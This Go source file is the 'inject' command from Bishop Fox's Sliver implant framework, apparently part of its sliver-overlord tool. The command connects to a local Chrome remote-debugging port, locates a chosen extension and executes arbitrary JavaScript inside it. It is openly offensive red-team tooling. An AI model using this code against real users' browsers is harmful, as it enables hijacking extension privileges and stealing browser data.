package cmd

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"

	"github.com/bishopfox/sliver-overlord/pkg/overlord"
	"github.com/spf13/cobra"
)

// InjectResult - Result of an injection
type InjectResult struct {
	Result string `json:"result"`
}

var injectCmd = &cobra.Command{
	Use:   "inject",
	Short: "Inject JS code",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		debuggingPort, err := cmd.Flags().GetInt(remoteDebuggingPortFlagStr)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", remoteDebuggingPortFlagStr, err)
			os.Exit(ExitBadFlag)
		}
		if debuggingPort < 1 || 65535 < debuggingPort {
			fmt.Printf(Warn+"Invalid port number %d\n", debuggingPort)
			os.Exit(ExitBadFlag)
		}
		extID, err := cmd.Flags().GetString(extensionIDStrFlag)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", extensionIDStrFlag, err)
			os.Exit(ExitBadFlag)
		}
		format, _ := getOutputFlags(cmd)
		jsCode := getJSCode(cmd)

		debugURL := url.URL{
			Scheme: "http",
			Host:   fmt.Sprintf("localhost:%d", debuggingPort),
			Path:   "/json",
		}

		targets, err := overlord.QueryExtensionDebugTargets(debugURL.String())
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitDebugQueryError)
		}

		found := false
		result := []byte{}
		for _, target := range targets {
			extURL, err := url.Parse(target.URL)
			if err != nil {
				continue
			}
			if extURL.Scheme == "chrome-extension" && extURL.Host == extID {
				result, err = overlord.ExecuteJS(target.WebSocketDebuggerURL, target.ID, jsCode)
				if err != nil {
					os.Exit(ExitExecuteJSError)
				}
				found = true
				break
			}
		}
		if !found {
			fmt.Printf(Warn+"Extension '%s' not found\n", extID)
			os.Exit(ExitTargetNotFound)
		}
		if format == consoleOutput {
			fmt.Printf(string(result))
		}
		if format == jsonOutput {
			data, err := json.Marshal(&InjectResult{Result: string(result)})
			if err != nil {
				fmt.Printf(Warn+"Failed to marshal result %s", err)
				os.Exit(ExitMarshalingErr)
			}
			fmt.Printf(string(data))
		}
	},
}
